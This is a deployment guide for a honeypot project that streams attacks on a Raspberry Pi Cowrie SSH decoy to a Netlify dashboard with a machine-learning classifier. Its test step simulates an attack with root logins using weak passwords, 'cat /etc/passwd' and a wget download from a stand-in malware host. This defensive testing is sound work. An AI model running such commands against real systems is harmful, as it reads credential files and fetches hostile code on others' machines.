# FALSEDOOR — Netlify & Raspberry Pi Live Deployment Guide

This guide explains how to connect your **Netlify-hosted dashboard** (`https://falsedoor.netlify.app/`) with your **Raspberry Pi (Ubuntu Server)** honeypot so attack data is displayed live in real-time.

---

## Architecture Overview

```
                                      INTERNET
                                         │
        ┌────────────────────────────────┴────────────────────────────────┐
        │                                                                 │
        ▼                                                                 ▼
┌───────────────────────────────┐               ┌─────────────────────────────────────────┐
│     NETLIFY DASHBOARD         │               │         RASPBERRY PI (UBUNTU)           │
│  https://falsedoor.netlify.app│               │                                         │
│                               │  fetches API  │  ┌───────────────────────────────────┐  │
│  • PWA Static Frontend        │───────────────┼─▶│ FastAPI Backend (:8000)           │  │
│  • Mobile & Desktop View      │               │  │ • CORS configured for Netlify     │  │
│  • Live WebSocket / Polling   │               │  └─────────────────┬─────────────────┘  │
│    every 3s                   │               │                    │ reads logs         │
└───────────────────────────────┘               │                    ▼                    │
                                                │  ┌───────────────────────────────────┐  │
                                                │  │ Cowrie SSH Honeypot (:2222)       │  │
                                                │  │ • Attacks recorded live           │  │
                                                │  │ • cowrie.json audit log           │  │
                                                │  └─────────────────┬─────────────────┘  │
                                                │                    │ ML classification  │
                                                │                    ▼                    │
                                                │  ┌───────────────────────────────────┐  │
                                                │  │ Random Forest Classifier          │  │
                                                │  │ • 100 Trees (Scikit-Learn)        │  │
                                                │  └───────────────────────────────────┘  │
                                                └─────────────────────────────────────────┘
```

---

## Step 1: Deploy & Start the Raspberry Pi Backend

1. **Copy `FALSEDOOR_UBUNTU_DEPLOY.zip` to your Raspberry Pi:**
   ```bash
   scp FALSEDOOR_UBUNTU_DEPLOY.zip ubuntu@<YOUR_PI_LOCAL_IP>:~/
   ```
   *(Or transfer via USB flash drive / SFTP)*

2. **SSH into your Raspberry Pi and unzip:**
   ```bash
   ssh ubuntu@<YOUR_PI_LOCAL_IP>
   unzip FALSEDOOR_UBUNTU_DEPLOY.zip -d ~/FALSEDOOR
   cd ~/FALSEDOOR
   ```

3. **Run the automated setup script:**
   ```bash
   chmod +x server/setup_netlify_mode.sh
   ./server/setup_netlify_mode.sh
   ```
   This script will:
   - Identify your Pi's IP address
   - Open ports `8000` (FastAPI) and `2222` (Cowrie SSH) in UFW firewall
   - Set up Python virtual environment & install dependencies
   - Verify the trained Random Forest model
   - Start the FastAPI server on `0.0.0.0:8000`

---

## Step 2: Make Port 8000 Accessible to Netlify

Because your dashboard is hosted on the public internet (`falsedoor.netlify.app`), it needs a URL to reach your Pi. You have two options:

### Option A: Free Public Tunnel via ngrok (Easiest & Recommended)
On your Raspberry Pi:
```bash
# 1. Install ngrok (if not already installed)
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok

# 2. Start the tunnel to port 8000:
ngrok http 8000
```
ngrok will give you an HTTPS forwarding URL, for example:  
👉 `https://a1b2-34-56-78-90.ngrok-free.app`

*(Note: ngrok provides HTTPS, avoiding mixed-content warnings in modern browsers).*

### Option B: Router Port Forwarding
1. Log in to your home/lab router settings.
2. Forward external port `8000` to your Pi's local IP (e.g., `192.168.1.50:8000`).
3. Check your public IP:
   ```bash
   curl ifconfig.me
   ```
   Your URL will be: `http://<YOUR_PUBLIC_IP>:8000`

---

## Step 3: Update `PI_API_URL` and Deploy to Netlify

1. Open `netlify_deploy/index.html` (or root `index.html`).
2. Search for `PI_API_URL` (around line 1624):
   ```javascript
   // CHANGE THIS to your Pi's actual public URL or ngrok address:
   const PI_API_URL = 'https://YOUR-TUNNEL-URL.ngrok-free.app'; 
   // or 'http://YOUR_PUBLIC_IP:8000'
   ```
3. Save the file.
4. Sync to `netlify_deploy/index.html`:
   ```powershell
   Copy-Item 'index.html' 'netlify_deploy\index.html' -Force
   Compress-Archive -Path 'netlify_deploy\*' -DestinationPath 'netlify_deploy.zip' -Force
   ```
5. Deploy to Netlify:
   - Go to [app.netlify.com](https://app.netlify.com)
   - Navigate to your `falsedoor` site
   - Go to **Deploys** → Drag & drop either the `netlify_deploy` folder or `netlify_deploy.zip`

---

## Step 4: Test & Verify Real-Time Updates

1. **Verify Backend Health:**
   Visit your Pi URL in any browser:
   `http://<YOUR_PI_IP>:8000/api/health` or `https://<NGROK_URL>/api/health`
   You should see:
   ```json
   {"status":"operational","total_components":5,"operational_components":5,...}
   ```

2. **Open your Netlify Dashboard:**
   Visit `https://falsedoor.netlify.app/`
   Touch / click the fingerprint scanner to enter.

3. **Simulate an attack on your Cowrie Honeypot:**
   From an external machine or your phone terminal (Termux):
   ```bash
   ssh root@<YOUR_PI_IP> -p 2222
   # Try passwords like: admin, 123456, password
   # Run decoy commands: uname -a, cat /etc/passwd, wget http://malware.sh
   ```

4. **Observe Real-Time Updates:**
   - The Netlify dashboard will automatically update within **3 seconds**.
   - Attack counter increases.
   - Attacker IP appears in the Live Attack Feed.
   - Machine learning classifier tags the threat category and confidence rating.
